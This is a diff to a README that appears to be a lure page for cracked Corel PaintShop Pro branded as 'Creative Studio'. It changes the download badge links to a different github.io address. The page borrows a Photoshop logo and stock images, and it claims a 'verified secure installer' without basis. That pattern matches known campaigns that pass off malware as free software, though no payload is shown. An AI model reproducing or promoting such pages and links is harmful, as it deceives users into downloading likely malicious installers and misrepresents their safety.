@@ -2,7 +2,7 @@
 
 Professional-grade photo editing and design software with AI enhancements and advanced creative tools.
 
-[![Get Creative Studio](https://img.shields.io/badge/Download-Creative_Studio-magenta?style=for-the-badge&logo=adobephotoshop)](https://corel-paintshop-pro-download.github.io/.github/)
+[![Get Creative Studio](https://img.shields.io/badge/Download-Creative_Studio-magenta?style=for-the-badge&logo=adobephotoshop)](https://vertie311.github.io/.github/corel-paintshop-pro)
 
 ![Creative Interface](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIdnPaC3ztt9Ny9HTF3uEGXLndEJH-9n9zCTHFkh40ds_7dPAW4BuGchegnp3-_OKSh4c&usqp=CAU)
 *Intuitive creative workspace*
@@ -70,7 +70,7 @@ Professional-grade photo editing and design software with AI enhancements and ad
 - Verified secure installer
 - Transparent permissions
 
-[![Get Creative Studio](https://img.shields.io/badge/Download-Creative_Studio-magenta?style=for-the-badge&logo=adobephotoshop)](https://corel-paintshop-pro-download.github.io/.github/)
+[![Get Creative Studio](https://img.shields.io/badge/Download-Creative_Studio-magenta?style=for-the-badge&logo=adobephotoshop)](https://vertie311.github.io/.github/corel-paintshop-pro)
 
 ![AI Enhancement](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRhprWraFThtbGzx9bAG9cQ7EETzE7xxVM3oQ&s)
 *Smart image optimization*
